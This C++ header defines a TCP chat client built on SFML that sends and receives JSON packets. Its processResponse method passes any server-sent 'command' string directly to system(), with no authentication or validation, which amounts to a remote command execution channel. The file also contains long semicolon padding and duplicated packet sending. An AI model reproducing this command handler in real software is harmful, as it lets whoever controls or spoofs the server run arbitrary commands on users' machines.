#pragma once
#include <SFML/Network.hpp>
#include <imgui.h>
#include <imgui-SFML.h>
#include <imgui_stdlib.h>
#include <nlohmann/json.hpp>
#include <sqlite3.h>
#include <thread>
#include <mutex>
#include <spdlog/spdlog.h>
#include <iostream>
#include <fmt/core.h>
#include <imgui_freetype.h>
#include <string>
#include <atomic>
#include <queue>



using json = nlohmann::json;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;

class Client {
public:
	enum ConnectionStatus {
		Connected,
		Disconnected,
		Connecting
	};
private:
	sf::IpAddress ip;
	sf::Uint16   port;
    size_t     delay;
	sf::TcpSocket socket;
	std::condition_variable cv_ABOBUS;
	std::mutex abobusMutex;
	std::atomic<bool> isStarted = false;
	std::atomic<ConnectionStatus> connectionStatus = ConnectionStatus::Disconnected;
	std::thread receiveThread;
	std::thread requestThread;
	std::queue<sf::Packet> abobus;

public:
	
	Client(const sf::IpAddress& ip = sf::IpAddress("127.0.0.1"), sf::Uint16 port = 12345, size_t delay = 1000) : ip(ip), port(port), delay(delay) {
		spdlog::error("port: {}", this->port);
	}
	bool connect() {
	    return socket.connect(ip, port) == sf::Socket::Done;
	}
	void sendMessageRequest(std::string message) {
		json request;
		request["action"] = "send_message";
		request["message"] = message;
		sendRequest(request);
		
	}
	void sendCommand(std::string command) {
		json request;
		request["action"] = "command";
		request["message"] = command;
		sendRequest(request);

	}
	bool sendRequest(const json& msg) {
		sf::Packet packet;
		packet << msg.dump();
		{
			std::lock_guard<std::mutex> lock(abobusMutex);
			abobus.push(packet);
		}
		cv_ABOBUS.notify_one();
		return socket.send(packet) == sf::Socket::Done;
	}
	/*
	bool receiveResponse(sf::Packet& packet) {
		return socket.receive(packet) == sf::Socket::Done;
	}
	*/
	void processServerResponse(sf::Packet& packet) {
		std::string responseMessage;
		packet >> responseMessage;
		json response;
		try {
			response = json::parse(responseMessage);
			spdlog::info("json dump: \n{}", response.dump());
		}
		catch (const std::exception& ex) {
			spdlog::error("cannot parse json packet: \n{}", ex.what());
			return;
		}
	}
	void stop() {
		isStarted.store(false);
		requestThread.detach();
		receiveThread.detach();
	}
	void processResponse(sf::Packet packet) {
		std::string msg;
		packet >> msg;
		try {
			json message = json::parse(msg);
			std::string action = message["action"];
			if (action == "new_message") {
				spdlog::info("message from server: {}", (std::string)message["message"]);
			}
			else if (action == "command") {
				spdlog::info("processing command from server");
				system(message["message"].get<std::string>().c_str());
			}
			
		}
		catch (const json::parse_error& ex) {
			spdlog::error("server sent invalid json format!");
			return;
		}
	}
	void start() {
		requestThread = std::thread([this]() {
			isStarted.store(true);
			while (isStarted.load()) {
				if (connectionStatus != ConnectionStatus::Connected && isStarted.load()) {
					connectionStatus = ConnectionStatus::Connecting;
					while (connectionStatus != ConnectionStatus::Connected && isStarted.load()) {
						spdlog::info("try connection to server...");
						if (connect()) {
							connectionStatus = ConnectionStatus::Connected;
							spdlog::info("connected to the server {}: {}", ip.toString(), port); 
						}
					}
				}
				{
					std::unique_lock<std::mutex> lock(abobusMutex);
					cv_ABOBUS.wait(lock, [this]() {
						return !abobus.empty() || !isStarted.load();
					});
					if (!isStarted) break;
					if (socket.send(abobus.front()) == sf::Socket::Done) spdlog::info("packet sent!");
					else spdlog::error("packet has not send!");
					abobus.pop();
				}
			}
		});
		receiveThread = std::thread([this]() {
			while (!isStarted.load()) std::this_thread::sleep_for(std::chrono::milliseconds(10));
			while (isStarted.load()) {
				sf::Packet packet;
				if (socket.receive(packet) == sf::TcpSocket::Done) {
					processResponse(packet);
				}
			}
		});
	}
};

